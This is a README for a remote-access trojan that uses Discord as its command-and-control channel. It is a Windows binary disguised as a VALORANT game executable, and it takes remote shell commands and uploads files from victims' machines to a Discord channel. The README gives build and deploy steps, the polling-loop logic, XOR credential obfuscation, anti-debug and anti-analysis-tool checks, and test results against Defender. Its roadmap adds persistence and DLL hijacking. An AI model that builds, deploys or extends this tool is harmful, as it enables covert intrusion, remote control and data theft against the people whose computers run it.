# opss-terconnect

Discord bot C2. Python, Nuitka-compiled Windows binary. Remote command execution, file download, and host discovery from a Discord control channel.

## How it works

One binary per target machine. Each target runs its own Discord bot (HTTP API client) with its own token. The binary polls the Discord REST API for commands in a control channel; the matching target executes and sends results back via HTTP.

```python
# Polling loop (inside each binary):
while True:
    messages = GET /channels/{channel_id}/messages?limit=10
    for each new message from admin:
        if "!exec <name> <cmd>" and name == my_hostname:
            run cmd locally → POST result back
        elif "!download <name> <path>" and name == my_hostname:
            read file → POST as attachment
        elif "!pingall":
            POST "alive" response
    sleep(5)
```

```bash
# Build per target
python token_gen.py "MT...bot-token..." "channel_id" "admin_id"
# → paste XOR-obfuscated bytes into VALORANT.py

pip install -r requirements.txt
python -m nuitka --onefile --windows-console-mode-disable \
    --windows-icon-from-ico=valorant.ico VALORANT.py
```

No Discord gateway WebSocket connection. No `discord.py` dependency. The binary uses only Python stdlib for HTTP (`urllib`) — significantly smaller than the previous `discord.py`-based build.

## Build

**One build per target. One token per target. Do not share binaries.**

```bash
# 1. Generate XOR-obfuscated config (on build machine, with real token)
python token_gen.py "MT...bot-token..." "channel_id" "admin_id"

# 2. Paste the output into VALORANT.py, replacing the placeholder lists

# 3. Compile
pip install -r requirements.txt
python -m nuitka --onefile --windows-console-mode=disable \
    --windows-icon-from-ico=valorant.ico VALORANT.py
```

The token, channel ID, and admin ID are XOR-obfuscated in the source — never in plaintext. The compiled binary does not reveal them via `strings` or static analysis.

## Deploy

Copy the `.exe` to the target machine. Run it. The bot connects to Discord, announces itself in the control channel, and waits for commands.

To stop: end the process in Task Manager.

## Commands

| Command | Description |
|---------|-------------|
| `!exec <name> <cmd>` | Run a shell command on the target matching `<name>` (hostname, uppercase) |
| `!download <name> <path>` | Upload a file from the target to the control channel (max 25 MB) |
| `!pingall` | Target responds with a presence check |

## Security

### Built-in

- **XOR-obfuscated credentials** — token, channel ID, admin ID as XOR byte arrays. No plaintext in source or binary. Defends against `strings` and static disassembly.
- **Anti-debug** — `IsDebuggerPresent` + `CheckRemoteDebuggerPresent` at startup. Silent exit if attached.
- **Anti-tool scan** — process list checked for ProcmDump, Process Hacker, x64dbg, Cheat Engine, WinDbg, IDA, dnSpy, and others. Silent exit if found.
- **Memory wiping** — decoded token held in a ctypes buffer, converted to string for the HTTP auth header, buffer then wiped. Reduces in-memory footprint.

### Limitations

- **Memory dump:** The token must be a string in memory for HTTP auth (`Authorization: Bot ***`). A dump taken while running finds it. XOR storage defends the binary on disk only.
- **Static token lifetime:** The token is decoded once at startup and stored in the HTTP headers dict for the life of the process. It can be improved to decode-per-request (shrinks the window), but each HTTP call needs the token string — Python doesn't allow secure string handling.
- **XOR key in repo:** The key and obfuscated bytes are committed. A reverse engineer who decodes the logic recovers the values. This stops casual analysis, not a determined debugger.
- **Anti-debug bypassable:** Checks can be circumvented by renaming tools, patching the binary, or dumping externally.
- **Polling latency:** 5-second polling interval vs real-time gateway. Acceptable for C2 command execution, not ideal for instant response.

## Case study

Tested against Defender and analysis:

| Method | Defender | Static analysis | Dynamic analysis | Verdict |
|--------|----------|----------------|------------------|---------|
| PyInstaller | Not flagged | Easy — token revealed | — | Failed |
| PyArmor | Flagged | Encrypted (good) | Token recovered | Failed |
| Nuitka | Not flagged | Failed | Token recovered | Best so far |

Nuitka is the current choice: AV-evasive, but dynamic analysis still recovers the token. The XOR-obfuscated config and anti-analysis defenses are effort to make that recovery harder.

## Cleanup

End the executable in Task Manager.

## Roadmap

1. Persistence
2. Custom token distribution server
3. Rotate final hash executable generation
4. DLL hijacking and hollowing

---

## Screenshots

**Connected**

![Connected](images/connected.png)

**Ping**

![Ping](images/ping.png)

**Command execution**

![Exec](images/exec.png)

**File download**

![Download](images/download.png)

**Bonus**

![Pwned](images/pwned.png)

> My friend sent me this after recovering the token from dynamic analysis on the PyArmor build.
